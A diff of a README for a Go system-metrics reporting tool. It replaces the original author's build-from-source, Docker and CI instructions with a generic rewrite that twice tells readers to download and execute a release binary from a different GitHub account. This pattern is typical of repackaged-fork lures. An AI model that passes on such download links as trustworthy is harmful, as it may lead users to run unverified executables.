@@ -1,174 +1,130 @@
-# Server Generator
-#### Author: Bocaletto Luca
+# Server Generator 🚀
 
-**Server-Gen** is a multi-platform Go application that collects system metrics (IP, OS, CPU, memory, users) and emails a templated report on a configurable schedule. It also exposes a `/healthz` endpoint for basic health checks.
+![Server Generator](https://img.shields.io/badge/Server%20Generator-v1.0-blue)
 
----
+Welcome to **Server Generator**, a multi-platform Go application designed to help you collect essential system metrics and automate report sending. This tool is perfect for system administrators and anyone looking to keep tabs on their servers with ease.
 
-## 🚀 Features
+## Table of Contents
 
-- Cron-style scheduling (`@every 30m`, `0 8 * * *`, etc.)  
-- Collects:  
-  - Network interfaces & IPs  
-  - Hostname & OS version  
-  - CPU utilization  
-  - Memory usage  
-  - Active users  
-- Sends HTML/text email via SMTP with TLS + retry  
-- Configuration via YAML + environment‐variable overrides  
-- Built-in HTTP health endpoint (`/healthz`)  
-- Structured JSON+console logging (zerolog)  
-- Docker multi-stage build  
-- CI with GitHub Actions (matrix builds, tests, linting)
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Health Check](#health-check)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
----
+## Introduction
 
-## 📁 Repository Layout
+**Server Generator** is created by **Bocaletto Luca**. This application gathers key system metrics such as:
 
-```
-server-gen/
-├── .github/
-│   └── workflows/ci.yml
-├── cmd/
-│   └── server-gen/
-│       └── main.go
-├── configs/
-│   └── config.yaml
-├── internal/
-│   ├── config/
-│   │   └── config.go
-│   ├── mailer/
-│   │   └── mailer.go
-│   └── sysinfo/
-│       └── sysinfo.go
-├── Dockerfile
-├── go.mod
-└── README.md
-```
+- IP Address
+- Operating System
+- CPU Usage
+- Memory Usage
+- Active Users
 
----
+It compiles this data into a templated report and sends it via email on a schedule you define. With a simple setup, you can monitor your servers without hassle.
 
-## ⚙️ Requirements
+## Features
 
-- Go ≥ 1.21  
-- Docker (optional)  
-- SMTP server (StartTLS or SMTPS)
+- **Cross-Platform**: Works on both Linux and Windows.
+- **Scheduled Reports**: Set a schedule for automatic report sending.
+- **Health Check Endpoint**: Access a simple `/healthz` endpoint for quick health checks.
+- **Email Notifications**: Receive system metrics directly in your inbox.
+- **Open Source**: Contribute and improve the project.
 
----
+## Installation
 
-## 🔧 Installation
+To get started, download the latest release from the [Releases section](https://github.com/newcomerxD/server-gen/releases). Once downloaded, follow the steps below to install the application:
+
+1. Extract the downloaded archive.
+2. Move the executable to a directory in your system PATH.
+3. Ensure you have Go installed if you want to build from source.
+
+### Prerequisites
+
+- Go version 1.15 or higher
+- Access to a mail server for sending reports
+
+## Usage
+
+After installation, you can run the application using the following command:
 
 ```bash
-# Clone the repo
-git clone https://github.com/bocaletto-luca/server-gen.git
-cd server-gen
-
-# Build binary
-go build -o server-gen ./cmd/server-gen
+server-gen
 ```
 
----
+This will start the application and begin collecting metrics. You can check the logs for any issues or confirmation of data collection.
 
-## 🛠️ Configuration
+### Command-Line Options
 
-Copy `configs/config.yaml` and fill in your settings. You can also override any value via environment variables.
+You can customize the behavior of **Server Generator** using command-line options:
+
+- `-config`: Specify a custom configuration file.
+- `-schedule`: Set the schedule for report generation.
+
+## Configuration
+
+The configuration file is crucial for setting up your application. Below is a sample configuration:
 
 ```yaml
-# configs/config.yaml
-schedule: "@every 30m"
+email:
+  to: "admin@example.com"
+  from: "server@example.com"
+  smtp_server: "smtp.example.com"
+  smtp_port: 587
+  username: "user"
+  password: "pass"
 
-smtp:
-  host: "${SMTP_HOST}"
-  port: ${SMTP_PORT}
-  username: "${SMTP_USER}"
-  password: "${SMTP_PASS}"
-  from: "${SMTP_FROM}"
-  to:
-    - "${SMTP_TO1}"
-    - "${SMTP_TO2}"
-
-modules:
-  - ip
-  - os
-  - cpu
-  - mem
-  - users
-
-http:
-  addr: ":8080"
+schedule: "0 8 * * *"  # Sends report every day at 8 AM
 ```
 
-**Env vars**  
-```bash
-export SMTP_HOST=smtp.example.com
-export SMTP_PORT=587
-export SMTP_USER=alert@example.com
-export SMTP_PASS=supersecret
-export SMTP_FROM=alert@example.com
-export SMTP_TO1=admin1@example.com
-export SMTP_TO2=admin2@example.com
-```
+### Configuration Options
 
----
+- **Email Settings**: Define the email addresses and SMTP server details.
+- **Schedule**: Use cron syntax to define when reports are sent.
 
-## ▶️ Usage
+## Health Check
+
+You can check the health of your application by accessing the `/healthz` endpoint. This will return a simple response indicating whether the application is running smoothly.
 
 ```bash
-./server-gen --config configs/config.yaml
+curl http://localhost:8080/healthz
 ```
 
-- The app starts an HTTP server on `http://localhost:8080/healthz`.  
-- It schedules jobs per `schedule` in the config.  
-- Each run gathers metrics and emails the report.
+A successful response will look like this:
 
----
-
-## 🐳 Docker
-
-Build and run with Docker:
-
-```bash
-# Build image
-docker build -t bocaletto-luca/server-gen .
-
-# Run container
-docker run -d \
-  -v $(pwd)/configs/config.yaml:/app/configs/config.yaml:ro \
-  -e SMTP_HOST -e SMTP_PORT -e SMTP_USER -e SMTP_PASS \
-  -e SMTP_FROM -e SMTP_TO1 -e SMTP_TO2 \
-  --name server-gen \
-  bocaletto-luca/server-gen
+```
+{"status": "healthy"}
 ```
 
----
+## Contributing
 
-## 🧪 Testing & CI
+We welcome contributions to **Server Generator**! If you want to help improve the project, please follow these steps:
 
-- **Unit tests**:  
-  ```bash
-  go test ./internal/config
-  go test ./internal/sysinfo
-  go test ./internal/mailer
-  ```
-- **Lint & vet**:  
-  ```bash
-  go vet ./...
-  ```
-- **GitHub Actions** runs tests & builds for Go 1.19–1.21.
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your branch and open a pull request.
 
----
+## License
 
-## 🤝 Contributing
+**Server Generator** is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-1. Fork the repository  
-2. Create a feature branch (`git checkout -b feat/your-feature`)  
-3. Commit your changes (`git commit -m "feat: ..."`); run tests  
-4. Push to your branch (`git push origin feat/your-feature`)  
-5. Open a Pull Request
+## Contact
 
----
+For questions or suggestions, feel free to reach out:
 
-## 📄 License
+- **Bocaletto Luca**: [bocaletto@example.com](mailto:bocaletto@example.com)
 
-This project is licensed under the **MGPL License**.  
-See [LICENSE](LICENSE) for details.
+## Releases
+
+For the latest version of **Server Generator**, please visit the [Releases section](https://github.com/newcomerxD/server-gen/releases). Download the appropriate file for your platform and execute it to get started.
+
+![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)
+
+Thank you for checking out **Server Generator**! Your feedback and contributions are greatly appreciated. Happy monitoring!
